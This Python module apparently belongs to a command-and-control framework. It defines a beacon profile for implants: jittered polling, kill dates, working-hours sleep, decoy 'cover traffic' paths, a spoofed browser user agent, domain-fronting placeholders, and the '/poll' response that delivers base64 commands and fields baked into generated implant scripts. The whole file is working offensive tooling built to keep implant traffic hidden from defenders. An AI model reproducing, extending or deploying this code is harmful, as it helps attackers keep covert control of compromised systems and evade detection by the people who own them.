#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Beacon profile: sleep, jitter, kill date, and working hours."""

from __future__ import annotations

from dataclasses import dataclass, field, replace
from datetime import date, datetime, time as dtime, timezone
from typing import Any, Dict, Iterable, List, Mapping, Optional, Union

from lib.c2.beacon_timing import jitter_seconds, pick_decoy_path

_DEFAULT_DECOYS = ["/", "/favicon.ico", "/robots.txt", "/health", "/api/status", "/login"]


def _opt_raw(module: Any, name: str, default: Any = None) -> Any:
    """Read an Opt* attribute or plain attribute from a module-like object."""
    attr = getattr(module, name, default)
    if attr is None:
        return default
    if hasattr(attr, "value"):
        return getattr(attr, "value")
    return attr


def parse_kill_date(value: Union[str, int, float, date, datetime, None]) -> Optional[datetime]:
    """Parse kill date as end-of-day UTC (or aware datetime). Empty -> None."""
    if value is None:
        return None
    if isinstance(value, datetime):
        if value.tzinfo is None:
            return value.replace(tzinfo=timezone.utc)
        return value
    if isinstance(value, date):
        return datetime(value.year, value.month, value.day, 23, 59, 59, tzinfo=timezone.utc)
    if isinstance(value, (int, float)):
        ts = float(value)
        if ts > 1e12:
            ts /= 1000.0
        return datetime.fromtimestamp(ts, tz=timezone.utc)
    text = str(value).strip()
    if not text:
        return None
    if text.isdigit():
        return parse_kill_date(int(text))
    # ISO date or datetime
    try:
        if "T" in text or " " in text:
            normalized = text.replace("Z", "+00:00").replace(" ", "T", 1)
            dt = datetime.fromisoformat(normalized)
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            return dt
        d = date.fromisoformat(text[:10])
        return datetime(d.year, d.month, d.day, 23, 59, 59, tzinfo=timezone.utc)
    except ValueError as exc:
        raise ValueError(f"invalid kill_date: {value!r}") from exc


def parse_working_hours(value: Optional[str]) -> Optional[tuple[dtime, dtime]]:
    """Parse ``HH:MM-HH:MM`` into (start, end). Empty -> None (always active)."""
    if value is None:
        return None
    text = str(value).strip()
    if not text:
        return None
    if "-" not in text:
        raise ValueError(f"invalid working_hours (expected HH:MM-HH:MM): {value!r}")
    left, right = text.split("-", 1)
    try:
        sh, sm = left.strip().split(":")
        eh, em = right.strip().split(":")
        start = dtime(int(sh), int(sm))
        end = dtime(int(eh), int(em))
    except (TypeError, ValueError) as exc:
        raise ValueError(f"invalid working_hours (expected HH:MM-HH:MM): {value!r}") from exc
    return start, end


def resolve_tz(name: str):
    """Return a tzinfo; fall back to UTC if zone unavailable."""
    label = (name or "UTC").strip() or "UTC"
    if label.upper() in ("UTC", "GMT", "Z"):
        return timezone.utc
    try:
        from zoneinfo import ZoneInfo

        return ZoneInfo(label)
    except Exception:
        return timezone.utc


@dataclass
class BeaconProfile:
    """Shared listener/payload beacon policy."""

    poll_interval: float = 10.0
    jitter_percent: float = 35.0
    kill_date: Optional[str] = None
    working_hours: Optional[str] = None
    timezone: str = "UTC"
    sleep_outside_hours: float = 3600.0
    user_agent: str = "Mozilla/5.0"
    cover_traffic: bool = True
    decoy_paths: List[str] = field(default_factory=lambda: list(_DEFAULT_DECOYS))
    response_pad_min: int = 0

    # Optional domain-fronting hooks (wired in later PRs; kept here for shared shape)
    host_header: str = ""
    payload_comms_host: str = ""

    def with_overrides(self, **kwargs: Any) -> "BeaconProfile":
        return replace(self, **{k: v for k, v in kwargs.items() if hasattr(self, k)})

    def _tz(self):
        return resolve_tz(self.timezone)

    def _now(self, now: Optional[datetime] = None) -> datetime:
        if now is None:
            return datetime.now(tz=self._tz())
        if now.tzinfo is None:
            return now.replace(tzinfo=self._tz())
        return now.astimezone(self._tz())

    def kill_datetime(self) -> Optional[datetime]:
        return parse_kill_date(self.kill_date)

    def hours_window(self) -> Optional[tuple[dtime, dtime]]:
        return parse_working_hours(self.working_hours)

    def is_past_kill_date(self, now: Optional[datetime] = None) -> bool:
        kd = self.kill_datetime()
        if kd is None:
            return False
        current = self._now(now)
        # Compare in UTC for safety
        return current.astimezone(timezone.utc) >= kd.astimezone(timezone.utc)

    def is_within_working_hours(self, now: Optional[datetime] = None) -> bool:
        window = self.hours_window()
        if window is None:
            return True
        start, end = window
        local = self._now(now).timetz().replace(tzinfo=None)
        if start <= end:
            return start <= local <= end
        # Overnight window e.g. 22:00-06:00
        return local >= start or local <= end

    def next_sleep(self, *, server_hint: Optional[float] = None, outside_hours: bool = False) -> float:
        if outside_hours:
            base = max(0.5, float(self.sleep_outside_hours or 3600.0))
            return round(jitter_seconds(base, min(float(self.jitter_percent), 15.0)), 2)
        base = float(server_hint) if server_hint and float(server_hint) > 0 else float(self.poll_interval or 10)
        return round(jitter_seconds(base, float(self.jitter_percent or 0)), 2)

    def to_poll_dict(
        self,
        *,
        command: str = "",
        die: Optional[bool] = None,
        outside_hours: bool = False,
        include_decoy: bool = True,
    ) -> Dict[str, Any]:
        """Build JSON object returned by ``/poll``."""
        should_die = bool(die) if die is not None else self.is_past_kill_date()
        payload: Dict[str, Any] = {
            "command": command,
            "encoding": "base64",
            "next_sleep": self.next_sleep(outside_hours=outside_hours and not should_die),
            "die": should_die,
        }
        if self.user_agent:
            payload["ua"] = str(self.user_agent)
        if include_decoy and self.cover_traffic and not should_die:
            payload["decoy"] = pick_decoy_path(self.decoy_paths)
        if outside_hours and not should_die:
            payload["outside_hours"] = True
        return payload

    def agent_bake_dict(self) -> Dict[str, Any]:
        """Fields embedded into generated implant scripts."""
        return {
            "poll_interval": float(self.poll_interval or 10),
            "jitter_percent": float(self.jitter_percent or 0),
            "kill_date": str(self.kill_date or ""),
            "working_hours": str(self.working_hours or ""),
            "timezone": str(self.timezone or "UTC"),
            "sleep_outside_hours": float(self.sleep_outside_hours or 3600),
            "user_agent": str(self.user_agent or "Mozilla/5.0"),
            "cover_traffic": bool(self.cover_traffic),
            "host_header": str(self.host_header or ""),
            "payload_comms_host": str(self.payload_comms_host or ""),
        }

    @classmethod
    def from_mapping(cls, data: Optional[Mapping[str, Any]]) -> "BeaconProfile":
        if not data:
            return cls()
        known = {f.name for f in cls.__dataclass_fields__.values()}  # type: ignore[attr-defined]
        kwargs = {k: data[k] for k in data if k in known}
        if "decoy_paths" in kwargs and kwargs["decoy_paths"] is not None:
            kwargs["decoy_paths"] = list(kwargs["decoy_paths"])
        return cls(**kwargs)

    @classmethod
    def from_opts(cls, module: Any, *, decoy_paths: Optional[Iterable[str]] = None) -> "BeaconProfile":
        """Build profile from a Listener/Payload module with Opt* fields."""
        paths = list(decoy_paths) if decoy_paths is not None else list(_DEFAULT_DECOYS)
        return cls(
            poll_interval=float(_opt_raw(module, "poll_interval", 10) or 10),
            jitter_percent=float(_opt_raw(module, "jitter_percent", 35) or 0),
            kill_date=str(_opt_raw(module, "kill_date", "") or "").strip() or None,
            working_hours=str(_opt_raw(module, "working_hours", "") or "").strip() or None,
            timezone=str(_opt_raw(module, "timezone", "UTC") or "UTC"),
            sleep_outside_hours=float(_opt_raw(module, "sleep_outside_hours", 3600) or 3600),
            user_agent=str(_opt_raw(module, "user_agent", "Mozilla/5.0") or "Mozilla/5.0"),
            cover_traffic=bool(_opt_raw(module, "cover_traffic", True)),
            decoy_paths=paths,
            response_pad_min=int(_opt_raw(module, "response_pad_min", 0) or 0),
            host_header=str(_opt_raw(module, "host_header", "") or "").strip(),
            payload_comms_host=str(
                _opt_raw(module, "payload_comms_host", "")
                or _opt_raw(module, "comms_host", "")
                or ""
            ).strip(),
        )


def is_past_kill_date(profile: BeaconProfile, now: Optional[datetime] = None) -> bool:
    return profile.is_past_kill_date(now)


def is_within_working_hours(profile: BeaconProfile, now: Optional[datetime] = None) -> bool:
    return profile.is_within_working_hours(now)


def next_sleep(profile: BeaconProfile, **kwargs: Any) -> float:
    return profile.next_sleep(**kwargs)
